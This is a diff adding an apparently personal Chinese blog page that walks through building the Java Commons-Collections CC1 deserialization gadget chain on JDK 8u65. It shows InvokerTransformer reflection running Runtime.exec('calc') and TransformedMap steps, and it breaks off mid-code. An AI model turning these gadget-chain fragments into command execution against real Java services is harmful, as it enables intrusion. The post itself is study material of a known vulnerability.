@@ -1,0 +1,1109 @@
+
+<!DOCTYPE html><html lang="en">
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.33.1" theme-name="Stellar" theme-version="1.33.1">
+  
+  
+  <meta name="generator" content="Hexo 8.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000">
+  <meta name="theme-color" content="#f9fafb">
+  <title>JavaEECC1链条持续更新+fastjson1.2.24+log4j - Hexo</title>
+
+  
+    <meta name="description" content="JavaEECC链条">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JavaEECC1链条持续更新+fastjson1.2.24+log4j">
+<meta property="og:url" content="http://example.com/2025/10/29/posts/cc/">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="JavaEECC链条">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/cc/c1.png">
+<meta property="og:image" content="http://example.com/images/cc/c2.png">
+<meta property="og:image" content="http://example.com/images/cc/c3.png">
+<meta property="og:image" content="http://example.com/images/cc/c4.png">
+<meta property="og:image" content="http://example.com/images/cc/5.png">
+<meta property="og:image" content="http://example.com/images/cc/6.png">
+<meta property="og:image" content="http://example.com/images/cc/7.png">
+<meta property="og:image" content="http://example.com/images/cc/f1.png">
+<meta property="og:image" content="http://example.com/images/cc/f2.png">
+<meta property="og:image" content="http://example.com/images/cc/f3.png">
+<meta property="og:image" content="http://example.com/images/cc/f4.png">
+<meta property="og:image" content="http://example.com/images/cc/f5.png">
+<meta property="og:image" content="http://example.com/images/cc/f6.png">
+<meta property="og:image" content="http://example.com/images/cc/l1.png">
+<meta property="og:image" content="http://example.com/images/cc/l2.png">
+<meta property="article:published_time" content="2025-10-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-11-01T03:00:04.000Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="JavaEE">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/cc/c1.png">
+  
+  
+  
+  <meta name="keywords" content="JavaEE">
+
+  <!-- feed -->
+  
+
+  <link rel="stylesheet" href="/css/main.css?v=1.33.1">
+
+
+  
+
+  
+
+  <script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"John Doe","sameAs":[]},"dateCreated":"2025-10-29T00:00:00+08:00","dateModified":"2025-11-01T11:00:04+08:00","datePublished":"2025-10-29T00:00:00+08:00","description":"JavaEECC链条","headline":"JavaEECC1链条持续更新+fastjson1.2.24+log4j","mainEntityOfPage":{"@type":"WebPage","@id":"http://example.com/2025/10/29/posts/cc/"},"publisher":{"@type":"Organization","name":"John Doe","sameAs":[]},"url":"http://example.com/2025/10/29/posts/cc/","keywords":"JavaEE","image":[]}</script>
+  <link rel="stylesheet" href="/custom/css/self.css"><link rel="stylesheet" href="/custom/css/self.css"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css">
+</head>
+<body><div id="l_cover">
+
+</div><div class="l_body content" id="start" layout="post" type="tech" ><aside class="l_left"><div class="sidebg"></div><div class="leftbar-container">
+
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://i.bobopic.com/small/128905928.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/image/2659360.svg';"></a><a class="title" href="/"><div class="main">Starrui777-zone</div><div class="sub normal cap">天天都有好心情</div><div class="sub hover cap" style="opacity:0"> 天天都可以摸猫</div></a></div></header>
+
+<div class="nav-area">
+
+<nav class="menu dis-select"><a class="nav-item active" title="博客" href="/" style="color:#1BCDFC"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M5.879 2.879C5 3.757 5 5.172 5 8v8c0 2.828 0 4.243.879 5.121C6.757 22 8.172 22 11 22h2c2.828 0 4.243 0 5.121-.879C19 20.243 19 18.828 19 16V8c0-2.828 0-4.243-.879-5.121C17.243 2 15.828 2 13 2h-2c-2.828 0-4.243 0-5.121.879M8.25 17a.75.75 0 0 1 .75-.75h3a.75.75 0 0 1 0 1.5H9a.75.75 0 0 1-.75-.75M9 12.25a.75.75 0 0 0 0 1.5h6a.75.75 0 0 0 0-1.5zM8.25 9A.75.75 0 0 1 9 8.25h6a.75.75 0 0 1 0 1.5H9A.75.75 0 0 1 8.25 9" clip-rule="evenodd"/><path fill="currentColor" d="M5.235 4.058C5 4.941 5 6.177 5 8v8c0 1.823 0 3.058.235 3.942L5 19.924c-.975-.096-1.631-.313-2.121-.803C2 18.243 2 16.828 2 14v-4c0-2.829 0-4.243.879-5.121c.49-.49 1.146-.707 2.121-.803zm13.53 15.884C19 19.058 19 17.822 19 16V8c0-1.823 0-3.059-.235-3.942l.235.018c.975.096 1.631.313 2.121.803C22 5.757 22 7.17 22 9.999v4c0 2.83 0 4.243-.879 5.122c-.49.49-1.146.707-2.121.803z" opacity=".5"/></svg></a><a class="nav-item" title="文档" href="/wiki/" style="color:#3DC550"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" fill-rule="evenodd" d="M14.25 4.48v3.057c0 .111 0 .27.02.406a.936.936 0 0 0 .445.683a.96.96 0 0 0 .783.072c.13-.04.272-.108.378-.159L17 8.005l1.124.534c.106.05.248.119.378.16a.958.958 0 0 0 .783-.073a.936.936 0 0 0 .444-.683c.021-.136.021-.295.021-.406V3.031c.113-.005.224-.01.332-.013C21.154 2.98 22 3.86 22 4.933v11.21c0 1.112-.906 2.01-2.015 2.08c-.97.06-2.108.179-2.985.41c-1.082.286-1.99 1.068-3.373 1.436c-.626.167-1.324.257-1.627.323V5.174c.32-.079 1.382-.203 1.674-.371c.184-.107.377-.216.576-.323m5.478 8.338a.75.75 0 0 1-.546.91l-4 1a.75.75 0 0 1-.364-1.456l4-1a.75.75 0 0 1 .91.546" clip-rule="evenodd"/><path fill="currentColor" d="M18.25 3.151c-.62.073-1.23.18-1.75.336a8.2 8.2 0 0 0-.75.27v3.182l.75-.356l.008-.005a1.13 1.13 0 0 1 .492-.13c.047 0 .094.004.138.01c.175.029.315.1.354.12l.009.005l.749.356V3.647z"/><path fill="currentColor" d="M12 5.214c-.334-.064-1.057-.161-1.718-.339C8.938 4.515 8.05 3.765 7 3.487c-.887-.234-2.041-.352-3.018-.412C2.886 3.007 2 3.9 2 4.998v11.146c0 1.11.906 2.01 2.015 2.079c.97.06 2.108.179 2.985.41c.486.129 1.216.431 1.873.726c1.005.451 2.052.797 3.127 1.034z" opacity=".5"/><path fill="currentColor" d="M4.273 12.818a.75.75 0 0 1 .91-.545l4 1a.75.75 0 1 1-.365 1.455l-4-1a.75.75 0 0 1-.545-.91m.909-4.545a.75.75 0 1 0-.364 1.455l4 1a.75.75 0 0 0 .364-1.455z"/></svg></a><a class="nav-item" title="笔记" href="/notebooks/" style="color:#FA6400"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="m13.629 20.472l-.542.916c-.483.816-1.69.816-2.174 0l-.542-.916c-.42-.71-.63-1.066-.968-1.262c-.338-.197-.763-.204-1.613-.219c-1.256-.021-2.043-.098-2.703-.372a5 5 0 0 1-2.706-2.706C2 14.995 2 13.83 2 11.5v-1c0-3.273 0-4.91.737-6.112a5 5 0 0 1 1.65-1.651C5.59 2 7.228 2 10.5 2h3c3.273 0 4.91 0 6.113.737a5 5 0 0 1 1.65 1.65C22 5.59 22 7.228 22 10.5v1c0 2.33 0 3.495-.38 4.413a5 5 0 0 1-2.707 2.706c-.66.274-1.447.35-2.703.372c-.85.015-1.275.022-1.613.219c-.338.196-.548.551-.968 1.262" opacity=".5"/><path fill="currentColor" d="M10.99 14.308c-1.327-.978-3.49-2.84-3.49-4.593c0-2.677 2.475-3.677 4.5-1.609c2.025-2.068 4.5-1.068 4.5 1.609c0 1.752-2.163 3.615-3.49 4.593c-.454.335-.681.502-1.01.502c-.329 0-.556-.167-1.01-.502"/></svg></a><a class="nav-item" title="关于" href="/about/" style="color:#FF1493"><svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24"><path fill="currentColor" d="M20 12a8 8 0 1 1-16 0a8 8 0 0 1 16 0" opacity=".5"/><path fill="currentColor" d="M17.712 5.453c1.047-.193 2.006-.259 2.797-.152c.77.103 1.536.393 1.956 1.064c.446.714.312 1.542-.012 2.258c-.33.728-.918 1.499-1.672 2.268c-1.516 1.547-3.836 3.226-6.597 4.697c-2.763 1.472-5.495 2.484-7.694 2.92c-1.095.217-2.098.299-2.923.201c-.8-.095-1.6-.383-2.032-1.075c-.47-.752-.296-1.63.07-2.379c.375-.768 1.032-1.586 1.872-2.403L4 12.416c0 .219.083.71.168 1.146c.045.23.09.444.123.596c-.652.666-1.098 1.263-1.339 1.756c-.277.567-.208.825-.145.925c.072.116.305.305.937.38c.609.073 1.44.018 2.455-.183c2.02-.4 4.613-1.351 7.28-2.772c2.667-1.42 4.85-3.015 6.23-4.423c.694-.707 1.15-1.334 1.377-1.836c.233-.515.167-.75.107-.844c-.07-.112-.289-.294-.883-.374c-.542-.072-1.272-.041-2.163.112L16.87 5.656c.338-.101.658-.17.842-.203"/></svg></a></nav>
+</div>
+<div class="widgets">
+<div class="search-wrapper" id="search-wrapper"><form class="search-form"><a class="search-button" onclick="document.getElementById(&quot;search-input&quot;).focus();"><svg t="1705074644177" viewBox="0 0 1025 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="1560" width="200" height="200"><path d="M1008.839137 935.96571L792.364903 719.491476a56.783488 56.783488 0 0 0-80.152866 0 358.53545 358.53545 0 1 1 100.857314-335.166073 362.840335 362.840335 0 0 1-3.689902 170.145468 51.248635 51.248635 0 1 0 99.217358 26.444296 462.057693 462.057693 0 1 0-158.255785 242.303546l185.930047 185.725053a51.248635 51.248635 0 0 0 72.568068 0 51.248635 51.248635 0 0 0 0-72.978056z" p-id="1561"></path><path d="M616.479587 615.969233a50.428657 50.428657 0 0 0-61.498362-5.534852 174.655348 174.655348 0 0 1-177.525271 3.484907 49.403684 49.403684 0 0 0-58.833433 6.76482l-3.074918 2.869923a49.403684 49.403684 0 0 0 8.609771 78.10292 277.767601 277.767601 0 0 0 286.992355-5.739847 49.403684 49.403684 0 0 0 8.404776-76.667958z" p-id="1562"></path></svg></a><input type="text" class="search-input" id="search-input" placeholder="Search"></form><div id="search-result"></div><div class="search-no-result">No Results!</div></div>
+
+
+
+<widget class="widget-wrapper recent post-list"><div class="widget-header dis-select"><span class="name">Recent Update</span></div><div class="widget-body fs14"><a class="item title" href="/2026/01/20/posts/bt2-lesuo/"><span class="title">勒索事件排查-青少年</span></a><a class="item title" href="/2026/01/19/posts/bt1/"><span class="title">公交车事件排查靶机-青少年</span></a><a class="item title" href="/2026/01/23/posts/dream/"><span class="title">上班的生活-记录开始</span></a><a class="item title" href="/2025/11/04/posts/memory/"><span class="title">JAVA-内存马+servlet+Filter</span></a><a class="item title" href="/2025/10/29/posts/cc/"><span class="title">JavaEECC1链条持续更新+fastjson1.2.24+log4j</span></a></div></widget>
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/Starrui777/Starrui777.github.io/tree/main" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/08a41b181ce68.svg"/></a><a class="social" href="https://music.163.com/#/playlist?id=369828878" target="_blank" rel="external nofollow noopener noreferrer"><img src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.12/social/3845874.svg"/></a><a class="social" href="https://space.bilibili.com/107029949?spm_id_from=333.1007.0.0" target="_blank" rel="external nofollow noopener noreferrer"><img src="/icon/bilibili.svg" /></a></div></footer>
+</div></aside><div class="l_main" id="main">
+
+
+
+
+
+<div class="article banner top">
+  <div class="content">
+    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">Home</a>
+<span class="sep"></span><a class="cap breadcrumb" href="/">Blog</a></div>
+<div class="flex-row" id="post-meta"><span class="text created">Posted on: <time datetime="2025-10-28T16:00:00.000Z">2025-10-29</time></span><span class="sep updated"></span><span class="text updated">Updated on: <time datetime="2025-11-01T03:00:04.000Z">2025-11-01</time></span></div></div></div>
+    
+    <div class="bottom only-title">
+      
+      <div class="text-area">
+        <h1 class="text title"><span>JavaEECC1链条持续更新+fastjson1.2.24+log4j</span></h1>
+        
+      </div>
+    </div>
+    
+  </div>
+  </div><article class="md-text content"><h2 id="JavaEECC链条"><a href="#JavaEECC链条" class="headerlink" title="JavaEECC链条"></a>JavaEECC链条</h2><span id="more"></span> 
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">别沉淀了行吗</span><br></pre></td></tr></table></figure>
+
+<h3 id="一：-下载对应的CDK-8u65以及CC链条1"><a href="#一：-下载对应的CDK-8u65以及CC链条1" class="headerlink" title="一： 下载对应的CDK 8u65以及CC链条1"></a>一： 下载对应的CDK 8u65以及CC链条1</h3><p>参考<a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12115">JAVA安全初探(三):CC1链全分析-先知社区</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">Oracle JDK 8u65 全平台安装包下载 - 码霸霸</a></p>
+<p><strong>JDK 8u71 及之后的版本中</strong>，Oracle 对该方法的逻辑进行了修改，增加了对恶意类的校验，直接导致 CC1 链的利用路径被阻断。而<strong>JDK 8u65（属于 8u71 之前的版本）</strong> 未包含这些安全修复，仍保留了原始的反序列化逻辑，因此能成功触发漏洞</p>
+<p><code>注意CC1和版本CC链条3.21没关  CC1是CC链条的第一个链条不是CC版本</code></p>
+<p>3.2.1包含了CC1的链条和JDK配合进行反序列化测试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">&lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">&lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">&lt;classifier&gt;sources&lt;/classifier&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;project xmlns=&quot;http://maven.apache.org/POM/4.0.0&quot;</span><br><span class="line">         xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span><br><span class="line">         xsi:schemaLocation=&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;&gt;</span><br><span class="line">    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;</span><br><span class="line"></span><br><span class="line">    &lt;groupId&gt;com.yr&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;CC1&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;</span><br><span class="line"></span><br><span class="line">    &lt;properties&gt;</span><br><span class="line">        &lt;maven.compiler.source&gt;8&lt;/maven.compiler.source&gt;</span><br><span class="line">        &lt;maven.compiler.target&gt;8&lt;/maven.compiler.target&gt;</span><br><span class="line">        &lt;project.build.sourceEncoding&gt;UTF-8&lt;/project.build.sourceEncoding&gt;</span><br><span class="line">    &lt;/properties&gt;</span><br><span class="line">    &lt;dependencies&gt;</span><br><span class="line">        &lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span><br><span class="line">        &lt;dependency&gt;</span><br><span class="line">            &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">            &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">        &lt;/dependency&gt;</span><br><span class="line">    &lt;/dependencies&gt;</span><br><span class="line"></span><br><span class="line">&lt;/project&gt;</span><br></pre></td></tr></table></figure>
+
+<p>同步后在lib里面看有无CC链条</p>
+<p><img src="/../images/cc/c1.png" alt="1"></p>
+<p>然后下载jdk的源码因为jdk里面我们这次的CC1都是class文件 我们无法跟踪需要源码来帮助</p>
+<p>你放入进去后你打开源码都是打开的java文件了</p>
+<p><a target="_blank" rel="noopener" href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">jdk8u&#x2F;jdk8u&#x2F;jdk: af660750b2f4</a></p>
+<p><a target="_blank" rel="noopener" href="https://archive.apache.org/dist/commons/collections/source/commons-collections-3.2.1-src.zip">https://archive.apache.org/dist/commons/collections/source/commons-collections-3.2.1-src.zip</a> 下载在库里面引用源码来查看</p>
+<p><img src="/../images/cc/c2.png" alt="1"></p>
+<p>到这里环境就配置完毕</p>
+<h4 id="一些前提"><a href="#一些前提" class="headerlink" title="一些前提"></a>一些前提</h4><p>1：只有实现了 <code>java.io.Serializable</code> 接口的类，才能被 Java 序列化 &#x2F; 反序列化机制处理</p>
+<p>2：Java 在反序列化对象时，会自动调用类中重写的 <code>readObject</code> 方法（若存在）。这个方法相当于一个 “钩子”—— 如果在其中写入恶意逻辑（或调用其他危险组件），就能在反序列化时被触发，成为漏洞利用的<strong>入口点</strong></p>
+<h4 id="1：Transformer接口与反射调用"><a href="#1：Transformer接口与反射调用" class="headerlink" title="1：Transformer接口与反射调用"></a>1：Transformer接口与反射调用</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">public Object transform(Object input);</span><br><span class="line">提交一个类返回一个类</span><br></pre></td></tr></table></figure>
+
+<p>然后我们查看下实现这个接口的类有哪些</p>
+<p>org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;functors&#x2F;InvokerTransformer.java 发现这个类用了这个接口</p>
+<p>ctrl+H 查看引用类</p>
+<p><img src="/../images/cc/c3.png" alt="1"></p>
+<p>这个类重写了接口</p>
+<p>核心逻辑通过反射调用目标的指定方法</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">    public InvokerTransformer(String methodName, Class[] paramTypes, Object[] args) &#123;</span><br><span class="line">        super();</span><br><span class="line">        iMethodName = methodName;</span><br><span class="line">        iParamTypes = paramTypes;</span><br><span class="line">        iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public Object transform(Object input) &#123;</span><br><span class="line">    if (input == null) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line">    try &#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        return method.invoke(input, iArgs);</span><br><span class="line">            </span><br><span class="line">    &#125; catch (NoSuchMethodException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; does not exist&quot;);</span><br><span class="line">    &#125; catch (IllegalAccessException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; cannot be accessed&quot;);</span><br><span class="line">    &#125; catch (InvocationTargetException ex) &#123;</span><br><span class="line">        throw new FunctorException(&quot;InvokerTransformer: The method &#x27;&quot; + iMethodName + &quot;&#x27; on &#x27;&quot; + input.getClass() + &quot;&#x27; threw an exception&quot;, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果我们要执行命令就比如用下面代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import org.junit.Test;</span><br><span class="line"></span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class test &#123;</span><br><span class="line">    @Test</span><br><span class="line">    public void invokerExec() throws IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那么我们怎么使用反射来进行调用runtime.exec来执行系统命令呢</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">InvokerTransformer invokerTransformernew =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">invokerTransformernew.transform(Runtime.getRuntime());</span><br><span class="line">通过这个代码调用transformer方法可以直接出系统命令</span><br><span class="line">new Class[]&#123;String.class&#125; → 告诉反射：“我要调用的 exec 方法需要一个 String 类型的参数”。</span><br><span class="line">new Object[]&#123;&quot;calc&quot;&#125; → 告诉反射：“给这个 exec 方法传入参数值 calc”。</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/cc/c4.png" alt="1"></p>
+<p>所以我们成功通过transformer执行了系统命令所以我们就要往前推了</p>
+<h4 id="2：谁调用了transform方法"><a href="#2：谁调用了transform方法" class="headerlink" title="2：谁调用了transform方法"></a>2：谁调用了transform方法</h4><p>找到了org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;map&#x2F;TransformedMap.java  这个里面调用了transformer</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br><span class="line">注意是protected</span><br></pre></td></tr></table></figure>
+
+<p>所以valueTransformer如果等于invokeTransformer.transform 就可以执行了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">    public static Map decorate(Map map, Transformer keyTransformer, Transformer valueTransformer) &#123;</span><br><span class="line">        return new TransformedMap(map, keyTransformer, valueTransformer);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">在它上面的这个方式是替换的核心方法</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果checkSetValue不是protect就是调用所以我们要找到能找到的调用checkSetValue的类</span><br><span class="line">public void invokerExec2() throws IOException &#123;</span><br><span class="line">    InvokerTransformer invokerTransformernew =new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;);</span><br><span class="line">    Map decorate = TransformedMap.decorate(null,null,invokerTransformernew);</span><br><span class="line">    TransformedMap.checkSetValue()</span><br></pre></td></tr></table></figure>
+
+<p>所以decorate可以构建TransformedMap类但是是protect的</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>查找用法在org&#x2F;apache&#x2F;commons&#x2F;collections&#x2F;map&#x2F;AbstractInputCheckedMapDecorator.java</p>
+<p>TransformedMap<code>继承自</code>AbstractInputCheckedMapDecorator</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">找到了checkSetValue</span><br><span class="line">public Object setValue(Object value) &#123;</span><br><span class="line">    value = parent.checkSetValue(value);</span><br><span class="line">    return entry.setValue(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以我们整理一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected Object checkSetValue(Object value) &#123;</span><br><span class="line">    return valueTransformer.transform(value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>1 InvokerTransformer继承了transformer接口，TransformedMap里面可以调用InvokerTransformer</p>
+<p>2 我们通过decorate来生成一个Map对象里面Transformer valueTransformer就传入 invokerTransformernew(自己定义的) 因为invokexx 是实现了这接口的</p>
+<p>3 我们设置好了invoketransformer(但是里面的数值我们还不能设置啊)</p>
+<p>4我们找到了setValue里面调用了checkSetValue我们就传入Runtime.getRuntime()就可以执行了</p>
+<p>tip:</p>
+<p>​	1 子类没有重写父类方法</p>
+<p>​	2 使 <code>parent</code> 指向子类实例，调用 <code>parent.checkSetValue</code> 时，执行的还是 <strong>父类的 <code>checkSetValue</code> 方法</strong>（因为子类没有提供新的实现，只能用父类的）</p>
+<p>​	3 return new TransformedMap(map, keyTransformer, valueTransformer); 这个是有了原本map的数据，然后我们**<code>Map</code> 的 <code>entrySet()</code> 方法获取 <code>MapEntry</code> 实例**，再调用它的方法</p>
+<p>案例</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class TestMapEntry &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        // 1. 创建Map并添加数据</span><br><span class="line">        Map&lt;String, String&gt; map = new HashMap&lt;&gt;();</span><br><span class="line">        map.put(&quot;name&quot;, &quot;张三&quot;);</span><br><span class="line">        map.put(&quot;age&quot;, &quot;20&quot;);</span><br><span class="line"></span><br><span class="line">        // 2. 获取所有MapEntry实例</span><br><span class="line">        Set&lt;Map.Entry&lt;String, String&gt;&gt; entries = map.entrySet();</span><br><span class="line"></span><br><span class="line">        // 3. 遍历并调用MapEntry的方法</span><br><span class="line">        for (Map.Entry&lt;String, String&gt; entry : entries) &#123;</span><br><span class="line">            // 调用getKey()和getValue()</span><br><span class="line">            String key = entry.getKey();</span><br><span class="line">            String value = entry.getValue();</span><br><span class="line">            System.out.println(&quot;key: &quot; + key + &quot;, value: &quot; + value);</span><br><span class="line"></span><br><span class="line">            // 